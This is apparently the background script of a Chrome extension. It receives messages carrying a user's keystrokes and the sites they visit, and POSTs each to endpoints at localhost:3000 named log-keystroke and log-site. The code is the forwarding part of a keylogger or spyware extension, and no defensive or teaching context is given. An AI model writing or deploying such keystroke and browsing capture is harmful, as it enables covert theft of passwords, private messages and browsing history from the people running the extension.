chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.type === "keystroke") {
    console.log("Storing keystroke: " + request.data);
    fetch('http://localhost:3000/log-keystroke', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ keystroke: request.data })
    });
  } else if (request.type === "site") {
    console.log("Detected site: " + request.data);
    fetch('http://localhost:3000/log-site', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ site: request.data })
    });
  }
});
